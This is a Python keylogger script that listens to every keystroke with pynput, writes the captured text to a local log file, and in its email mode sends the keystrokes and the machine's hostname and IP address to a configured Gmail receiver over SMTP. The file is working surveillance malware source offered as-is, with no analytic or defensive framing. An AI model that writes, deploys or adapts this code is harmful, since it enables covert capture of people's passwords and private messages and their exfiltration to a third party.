
from pynput.keyboard import Key, Listener
import time
import smtplib, ssl
from KeyLogger.config import newConfig, bcolors
import os
import json
import socket   

def getIP():
    hostname=socket.gethostname()   
    IPAddr=socket.gethostbyname(hostname)   
    return hostname, IPAddr



with open("./config.json","r") as file:
    parsed = json.load(file)
    Jsender_email = parsed["sender_email"]
    Jsender_password = parsed["sender_password"]
    Jreceiver_email = parsed["receiver_email"]

    mode = parsed['mode']
Key_mode = True
Email_mode = False
    
if mode == "email":
    Key_mode = False
    Email_mode = True
elif mode == "local":
    Key_mode = True
    Email_mode = False
def email(keysGiven):
    port = 465  # For SSL
    smtp_server = "smtp.gmail.com"
    sender_email = Jsender_email
    receiver_email = Jreceiver_email  
    password = Jsender_password
    message = f"""\
        Subject: KEYS 

    {keysGiven}."""

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
keys_pressed = 0
SendMail = bool
keys = []
def on_press(key):
    global keys_pressed
    global keys
    emailBool = False
    keypressed = key
    if keypressed == Key.space:
        keypressed = "   "
    elif keypressed == Key.backspace:
        keypressed= "<== "
        keys_pressed =- 2
    elif keypressed == Key.enter:
        keypressed = "\n"
        emailBool = True
    elif keypressed == "'":
        keypressed = "_Apostro4phe_"
    elif str(keypressed).startswith("Key."):
        keypressed = ""
        keys_pressed =- 2
    keys.append(str(keypressed))
    keys_pressed += 1
    if keys_pressed > 20 and Key_mode == True:   
        file = open(f"./out/Spicy-Logs++", "a") 
        UNmessage = "".join(keys)
        message = UNmessage.replace("'","")
        message = message.replace("_Apostro4phe_","'")
        file.write(str(message))
        keys_pressed = 0 
        keys = []
    if emailBool == True and Email_mode == True:
        UNmessage = "".join(keys)
        message = UNmessage.replace("'","")
        message = message.replace("_Apostro4phe_","'")
        if SendMail == True:
            email(message)
        emailBool = False
        keys = []
def isMaillable():
    global SendMail
    try:
        host_Data = getIP()
        email(f"Started Process || {host_Data}")
        SendMail = True 
    except:
        SendMail = False
        print(SendMail)
with Listener(on_press=on_press) as listener :
    isMaillable()
    listener.join()



